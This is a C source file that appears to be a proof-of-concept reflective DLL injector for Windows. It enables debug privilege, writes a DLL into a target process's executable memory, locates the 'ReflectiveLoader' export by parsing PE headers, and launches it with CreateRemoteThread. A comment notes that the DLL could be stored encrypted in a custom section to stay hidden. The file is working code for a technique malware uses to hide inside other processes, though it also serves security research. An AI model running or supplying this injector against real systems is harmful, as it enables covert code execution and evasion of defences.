#include "injector.h"

DWORD32 CalcHash(BYTE *str, DWORD size)
{
	DWORD32 p = 31;
	int m = 1e9 + 9;
	DWORD32 power_of_p = 1;
	DWORD32 hash_val = 0;

	for (int i = 0; i < size; i++) {
		hash_val = (hash_val + (str[i] - 'a' + 1) * power_of_p) % m;
		power_of_p = (power_of_p * p) % m;
	}
	return hash_val;
}

DWORD32 strLen(BYTE *str)
{
	DWORD32 i = 0;
	while (str[i] != 0) {
		i++;
	}
	return i;
}

#define DEBUG 1

DWORD inject(DWORD processid)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES priv = { 0 };

	/* ----------------------------------------------------------------------------------
	|  I am going to map the dll so i can assume that the dll is already in memory		|
	|  in real word scenario the dll can be stored encrypted into a custom section.     |
	|  --------------------------------------------------------------------------------*/

	HANDLE hFile = CreateFileA(PATH, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("Failed to open the file %s\n", PATH);
		return -1;
	}
	
	
	DWORD fileSize = GetFileSize(hFile, NULL);
	HANDLE fileObmem = CreateFileMapping(hFile, NULL, PAGE_EXECUTE_READWRITE, 0, 0, NULL);
	if (fileObmem == NULL) return GetLastError();
	LPVOID dllStoredM = MapViewOfFile(fileObmem, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (dllStoredM == NULL) return GetLastError();
	CloseHandle(hFile);

	/*
	|---------------------------------------------------------------------|
	|	Now i'm going to write the image into the target process,         |
	|   In poc, it will be the current process						      |
	|---------------------------------------------------------------------|
	*/
	LPVOID dllBase;
	HANDLE hProcess;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid)) {
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
		}

		CloseHandle(hToken);
	}

	// open handle to the process
	hProcess = OpenProcess(desireAccess, FALSE, processid);
	if (hProcess == NULL)
	{
		printf("Failed to open the target process,0x%x", GetLastError());
		return GetLastError();
	}

	// allocate memory needed to allocate raw image 
	// ps. remenber, dllbase will be an address in remote process space address, 
	// it is not in current process memory space.
	if ((dllBase = VirtualAllocEx(hProcess, NULL, fileSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL)
	{
		printf("Failed allocate memory into target process");
		return -3;
	}
	// copy the image into the target process 
	if (!WriteProcessMemory(hProcess, dllBase, dllStoredM, fileSize, NULL))
	{
		printf("Failed write memory process");
		return -4;
	}

	// The dll is in memory as if it was in the disk, so is raw,
	// without any type of section, consequentially we need to
	// use offset instead of rva.

	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllStoredM;
	PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllStoredM + dosHeaders->e_lfanew);

	IMAGE_DATA_DIRECTORY dirEntry = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// get offset from the rva of the export directory entry.
	DWORD_PTR offset = Rva2Offset(dirEntry.VirtualAddress, (UINT_PTR)dllStoredM);
	// get the export table directory
	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(offset + (DWORD_PTR)dllStoredM);

	DWORD_PTR addOfname = Rva2Offset(exportDir->AddressOfNames, (UINT_PTR)dllStoredM) + (DWORD_PTR)dllStoredM;
	DWORD_PTR addOfnameOrd = Rva2Offset(exportDir->AddressOfNameOrdinals, (UINT_PTR)dllStoredM) + (DWORD_PTR)dllStoredM;
	DWORD_PTR addOfFunct = Rva2Offset(exportDir->AddressOfFunctions, (UINT_PTR)dllStoredM) + (DWORD_PTR)dllStoredM;

	// Now, in order to get the address of the export function we need to:
	// parse the address of name until we find the function name, once we got the name, save the index
	// use the index to get the ordinal value
	// use the ordinal value to get address of the function from address of function
	char *functionName;
	int x;
	DWORD_PTR address = 0;

	// parse the address of name
	for (x = 0; x < exportDir->NumberOfFunctions; x++) {
		address = *(DWORD_PTR*)(addOfname + x * (sizeof(BYTE) * 4));
		address = Rva2Offset(address, (UINT_PTR)dllStoredM) + (DWORD_PTR)dllStoredM;
		functionName = (char*)address;
		if (strcmp(functionName, "ReflectiveLoader") == 0) {
			break;
		}
	}
	// get ordinal value from ordinal value table
	address = addOfnameOrd + (x * 2);
	USHORT ordval = *(USHORT*)address;

	// get the rva address from the address of function
	address = *(DWORD_PTR*)(addOfFunct + (ordval * 4));
	//convert it to offset
	// to calulate this address we must now use dllbase,
	// because with createremotethread we can access to
	// remote process address space. 
	address = Rva2Offset(address, (UINT_PTR)dllStoredM) + (DWORD_PTR)dllBase;
	// Now the address point to the export function "ReflectiveLoader".
	// ULONG_PTR WINAPI ReflectiveLoader(LPVOID param).



	// In order to speed-up a little bit the things,
	// i'am going to pass the position of the dll 
	// (dllBase variable)  as argument to the bootstrap 
	// routine, in this way, once the routine will be executed,
	// it will already know his position in target process memory, 
	// and it won't have to calulate it by itself
	// p.s the bootstrap routine must know his position
	// in memory because it must load the dll
	// correctlly and make it become executable.

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)address, dllBase, (DWORD)NULL, NULL);

	
	WaitForSingleObject(hThread, INFINITE);

	while (1) {
		printf("Waiting..");
		Sleep(1000);
	}

	
}

DWORD32 Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);
	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
	{
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
	}
	return 0;
}